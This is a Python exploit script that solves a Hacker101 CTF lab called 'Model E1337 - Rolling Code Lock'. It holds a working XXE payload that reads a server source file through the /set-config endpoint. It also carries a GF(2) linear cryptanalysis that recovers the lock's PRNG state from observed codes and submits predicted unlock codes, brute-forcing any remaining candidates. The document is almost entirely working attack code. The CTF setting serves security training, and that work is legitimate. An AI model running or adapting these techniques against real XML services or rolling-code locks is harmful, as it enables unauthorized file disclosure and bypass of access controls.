#!/usr/bin/env python3
"""
PoC: Model E1337 - Rolling Code Lock (HackerOne CTF 101)

Exploits the PRNG-based rolling code lock to predict the next unlock code
using Gaussian elimination over GF(2).

Attack Chain:
  Flag 0: XXE via /set-config → read main.py
  Flag 1: GF(2) linear cryptanalysis of the PRNG → predict next code

Usage:
  python3 solve.py <ctf_url>

Example:
  python3 solve.py https://abc123.ctf.hacker101.com/
"""

import sys
import requests
import urllib.parse


# ─── PRNG Implementation (from rng.py) ───────────────────────────────────────

def setup(seed: int) -> int:
    """Initialize the 64-bit PRNG state from a 32-bit seed."""
    state = 0
    for _ in range(16):
        cur = seed & 3
        seed >>= 2
        state = (state << 4) | ((state & 3) ^ cur)
        state |= cur << 2
    return state


def step_state(state: int) -> tuple[int, int]:
    """Advance state by one bit. Returns (output_bit, new_state)."""
    bit = state & 1
    state = (state << 1) ^ (state >> 61)
    state &= 0xFFFFFFFFFFFFFFFF
    state ^= 0xFFFFFFFFFFFFFFFF
    for j in range(0, 64, 4):
        cur = (state >> j) & 0xF
        cur = (cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4)
        state ^= cur << j
    return bit, state


def next_n(state: int, bits: int) -> tuple[int, int]:
    """Generate `bits` bits of output and return (value, new_state)."""
    ret = 0
    for _ in range(bits):
        bit, state = step_state(state)
        ret = (ret << 1) | bit
    return ret, state


# ─── XXE Exploit (Flag 0) ────────────────────────────────────────────────────

def flag0_xxe(base_url: str) -> str | None:
    """Read main.py via XXE injection on /set-config."""
    payload = """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "main.py">
]>
<config><location>&xxe;</location></config>"""

    set_config_url = f"{base_url}/set-config?data={urllib.parse.quote(payload)}"
    get_config_url = f"{base_url}/get-config"

    # Trigger XXE (may time out on redirect; the side effect still happens)
    try:
        requests.get(set_config_url, timeout=10)
    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.ConnectionError:
        pass

    # Read the reflected file content
    resp = requests.get(get_config_url, timeout=10)
    content = resp.text

    # Extract flag from the XML body
    import re
    match = re.search(r'\^FLAG\^([0-9a-fA-F]+)\$FLAG\$', content)
    if match:
        return match.group(1)
    return None


# ─── GF(2) Linear Cryptanalysis (Flag 1) ─────────────────────────────────────

def gf2_gauss_elim(equations: list[list[int]], rhs: list[int], n_cols: int):
    """
    Gaussian elimination over GF(2).
    Returns (solution_bits, pivot_map) where solution_bits is a list of
    determined bits (free variables default to 0) and pivot_map maps
    column → pivot row.
    """
    aug = [row[:] + [rhs[i]] for i, row in enumerate(equations)]
    pivot_row = 0
    pivot_col = 0
    pivot_map = {}

    while pivot_col < n_cols and pivot_row < len(aug):
        pivot = -1
        for r in range(pivot_row, len(aug)):
            if aug[r][pivot_col]:
                pivot = r
                break
        if pivot == -1:
            pivot_col += 1
            continue
        if pivot != pivot_row:
            aug[pivot_row], aug[pivot] = aug[pivot], aug[pivot_row]
        pivot_map[pivot_col] = pivot_row
        for r in range(len(aug)):
            if r != pivot_row and aug[r][pivot_col]:
                for c in range(n_cols + 1):
                    aug[r][c] ^= aug[pivot_row][c]
        pivot_row += 1
        pivot_col += 1

    solution = [0] * n_cols
    for col, row in pivot_map.items():
        solution[col] = aug[row][n_cols]
    return solution, pivot_map


def recover_state(observed: list[int]) -> tuple[int, list[int], dict]:
    """
    Build a GF(2) linear system from observed next(26) outputs and solve
    for the 64-bit PRNG state at the time of the first observation.

    Returns (state, solution_bits, pivot_map).
    """
    # State row i: [coeff_0, ..., coeff_63, constant]
    state_rows = [[0] * 65 for _ in range(64)]
    for i in range(64):
        state_rows[i][i] = 1

    equations = []
    rhs_list = []

    for val in observed:
        for bit_pos in range(26):
            eq = state_rows[0][:64]
            const = state_rows[0][64]
            obs_bit = (val >> (25 - bit_pos)) & 1

            equations.append(eq)
            rhs_list.append(obs_bit ^ const)

            # Advance state symbolically through one step
            new_rows = [[0] * 65 for _ in range(64)]
            for i in range(64):
                left = state_rows[i - 1] if i >= 1 else [0] * 65
                right = state_rows[i + 61] if i + 61 < 64 else [0] * 65
                new_rows[i] = [left[c] ^ right[c] for c in range(65)]
            for i in range(64):
                new_rows[i][64] ^= 1  # state ^= 0xFFFF...
            for j in range(0, 64, 4):
                b0 = new_rows[j]
                b3 = new_rows[j + 3]
                new_rows[j] = [new_rows[j][c] ^ b3[c] for c in range(65)]
                new_rows[j + 1] = [new_rows[j + 1][c] ^ b3[c] for c in range(65)]
                new_rows[j + 2] = [new_rows[j + 2][c] ^ b0[c] for c in range(65)]
                new_rows[j + 3] = [new_rows[j + 3][c] ^ b0[c] for c in range(65)]
            state_rows = new_rows

    solution, pivot_map = gf2_gauss_elim(equations, rhs_list, 64)

    state_val = 0
    for i in range(64):
        if solution[i]:
            state_val |= (1 << i)

    return state_val, solution, pivot_map


def flag1_crack(base_url: str, num_observations: int = 7) -> str | None:
    """Collect observed codes, recover PRNG state, and submit predicted code."""
    observed = []

    print(f"[*] Collecting {num_observations} consecutive codes...")
    for i in range(num_observations):
        resp = requests.post(
            f"{base_url}/unlock",
            data={"code": f"{i:06d}"},
            timeout=30,
        )
        # Response: "Code incorrect.  Expected NNNNNNNN"
        import re
        match = re.search(r"Expected (\d+)", resp.text)
        if match:
            code = int(match.group(1))
            observed.append(code)
            print(f"    [{i}] {code:08d}")
        else:
            print(f"    [!] Unexpected response: {resp.text[:80]}")

    if len(observed) < 2:
        print("[!] Not enough observations collected.")
        return None

    print(f"[*] Building GF(2) system ({len(observed) * 26} equations, 64 unknowns)...")
    state_val, solution, pivot_map = recover_state(observed)

    uncovered = sorted(set(range(64)) - set(pivot_map.keys()))
    print(f"[*] Pivots: {len(pivot_map)}/64, free vars: {len(uncovered)}")

    # Verify the recovered state matches all observations
    s = state_val
    for i, expected in enumerate(observed):
        out, s = next_n(s, 26)
        if out != expected:
            print(f"[!] Verification failed at call {i}: expected {expected}, got {out}")
            return None

    if len(uncovered) == 0:
        # Fully determined — just one candidate
        next_code, _ = next_n(s, 26)
        candidates = [next_code]
    else:
        # Brute-force free variable assignments
        print(f"[*] Brute-forcing 2^{len(uncovered)} = {1 << len(uncovered)} assignments...")
        candidates = set()
        uncovered_sorted = sorted(uncovered)
        for combo in range(1 << len(uncovered)):
            trial = solution[:]
            for idx, col in enumerate(uncovered_sorted):
                trial[col] = (combo >> idx) & 1
            trial_state = 0
            for i in range(64):
                if trial[i]:
                    trial_state |= (1 << i)
            ts = trial_state
            valid = True
            for expected in observed:
                out, ts = next_n(ts, 26)
                if out != expected:
                    valid = False
                    break
            if valid:
                nc, _ = next_n(ts, 26)
                candidates.add(nc)
        print(f"[*] Found {len(candidates)} candidate unlock code(s)")

    for code in sorted(candidates):
        print(f"[*] Submitting code: {code}")
        resp = requests.post(
            f"{base_url}/unlock",
            data={"code": code},
            timeout=30,
        )
        if "Flag:" in resp.text or "Unlocked" in resp.text:
            import re
            match = re.search(r'\^FLAG\^([0-9a-fA-F]+)\$FLAG\$', resp.text)
            if match:
                return match.group(1)
        print(f"    Response: {resp.text[:80]}")

    return None


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ctf_base_url>")
        print(f"Example: {sys.argv[0]} https://abc123.ctf.hacker101.com/")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")

    print("=" * 60)
    print("  Model E1337 - Rolling Code Lock")
    print("  HackerOne CTF 101")
    print("=" * 60)

    # ── Flag 0: XXE ──
    print("\n── Flag 0: XXE via /set-config ──")
    flag0 = flag0_xxe(base_url)
    if flag0:
        print(f"[+] Flag 0: {flag0}")
    else:
        print("[-] Flag 0 not found (may already be captured or server changed)")

    # ── Flag 1: PRNG cryptanalysis ──
    print("\n── Flag 1: PRNG Cryptanalysis ──")
    flag1 = flag1_crack(base_url)
    if flag1:
        print(f"[+] Flag 1: {flag1}")
    else:
        print("[-] Flag 1 not found")


if __name__ == "__main__":
    main()
